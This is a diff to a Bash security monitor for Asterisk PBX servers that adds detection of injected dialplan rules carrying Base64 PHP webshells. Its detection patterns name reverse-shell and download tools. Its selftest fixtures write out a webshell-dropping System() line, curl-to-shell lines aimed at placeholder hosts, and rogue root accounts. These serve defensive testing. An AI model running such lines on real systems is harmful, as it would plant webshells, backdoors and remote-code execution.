@@ -484,6 +484,7 @@ cmd_audit() {
   grep -hiE '^ *allowguest *= *yes' /etc/asterisk/sip*.conf 2>/dev/null | head -1 | while read -r l; do warn "SIP aceita chamadas de visitante sem autenticacao ($l)"; done
   info "secao 9 verifica: AMI aberto, bindaddr 0.0.0.0, allowguest; dialplan malicioso e checado a cada minuto pelo monitor do host"
   grep -nE 'thanku-outcall|custom-get-extensions|Dial\(.*[0-9]{11,}' /etc/asterisk/extensions*.conf 2>/dev/null | head -5 | while read -r l; do warn "dialplan suspeito: $l"; done
+  grep -nEi '^\[injection-[0-9]+\]|PD9waHA|eval *\(' /etc/asterisk/extensions*.conf 2>/dev/null | cut -c1-160 | head -5 | while read -r l; do warn "injecao no dialplan: $l"; done
 
   sec "RESUMO"
   if [ "$AF" -eq 0 ]; then echo "  Nenhum sinal de alerta encontrado nesta auditoria."; else echo "  ${AF} ponto(s) marcado(s) com [!] para voce revisar."; fi
@@ -586,6 +587,19 @@ check_dialplan() {
   seen_once "dialplan|$hit" || return 0
   log "DIALPLAN malicioso: $hit"
   send_telegram "ALERTA: DIALPLAN MALICIOSO"$'\n'"Rotas piratas (thanku-outcall) encontradas no Asterisk:"$'\n'"${hit}"$'\n\n'"Nada foi alterado. Rode ipbx-security para limpar."
+}
+
+# Injecao de dialplan (incidente Couro Nobre, 02/11/2026): regra criada no modulo de injecoes do PBX vira
+# o contexto [injection-N] em extensions_additional.conf, intercepta um ramal (a chamada cai com 603) e carrega
+# payload de webshell em Base64 (PD9waHA... = "<?php"). So alerta; a remocao e feita pelo tecnico no painel.
+check_dialplan_injection() {
+  local g="${SENTINEL_DIALPLAN_GLOB:-/etc/asterisk/extensions*.conf}" hit
+  # shellcheck disable=SC2086
+  hit="$(grep -nEi '^\[injection-[0-9]+\]|PD9waHA|<\?php|eval *\(|base64 *(-d|--decode)|(System|Shell)\(.*(curl|wget|base64|bash -i|nc -e|/dev/tcp|\.php)' $g 2>/dev/null | cut -c1-160 | head -n 3)"
+  [ -n "$hit" ] || return 0
+  seen_once "dialplan-inj|$hit" || return 0
+  log "DIALPLAN injecao: $hit"
+  send_telegram "ALERTA: INJECAO NO DIALPLAN"$'\n'"Regra suspeita no Asterisk (pode desviar ramais e criar webshell PHP):"$'\n'"${hit}"$'\n\n'"Nada foi alterado. Remova a regra em Injecoes do PBX, recarregue o dialplan e rode: ipbx-sentinel --scan"$'\n'"Se a falha do framework estiver pendente: ipbx-sentinel --update-framework."
 }
 
 cron_of() {  # $1 = usuario
@@ -720,7 +734,7 @@ check_botnet() {
   [ -n "$p" ] && persist_alert "botnet|proc" "processo de varredura/ataque SIP em execucao neste servidor: $(echo "$p" | cut -c1-120)"
 }
 
-host_checks() { check_firewall; check_fail2ban; check_dialplan; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
+host_checks() { check_firewall; check_fail2ban; check_dialplan; check_dialplan_injection; check_cron; check_framework; check_persistence; check_immutable; check_botnet; }
 
 do_scan() {
   local mode="$1"
@@ -819,6 +833,7 @@ cmd_selftest() {
   mkdir -p "$T/bin" "$T/cron"
   printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
   echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
+  printf '[injection-1]\nexten => s559368,1,System(echo PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg== | base64 -d > /var/www/html/x.php)\n' > "$T/extensions_additional.conf"
   echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
   printf 'root:x:0:0:root:/root:/bin/bash\nyum:x:0:0::/home/yum:/bin/bash\nabort:x:0:0::/:/bin/bash\nasterisk:x:100:100::/:/bin/bash\n' > "$T/passwd"
   printf '#!/bin/bash\n/usr/local/sbin/motd.sh > /etc/motd\nbash -c "curl -ks http://203.0.113.9/r/postroot.sh|bash"\n' > "$T/rc.local"
@@ -830,7 +845,7 @@ cmd_selftest() {
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
-  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP"; do
+  for k in "FIREWALL: iptables parado" "DIALPLAN malicioso" "DIALPLAN injecao" "CRON suspeito" "FRAMEWORK vulneravel" "PERSISTENCIA: usuario com poderes de root alem do root: yum" "PERSISTENCIA: usuario com poderes de root alem do root: abort" "baixa e executa script remoto a cada boot" "sudo SEM SENHA para qualquer comando" "PROTEGIDO contra alteracao" "ferramenta de ataque SIP"; do
     if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
   done
   rm -rf "$T"
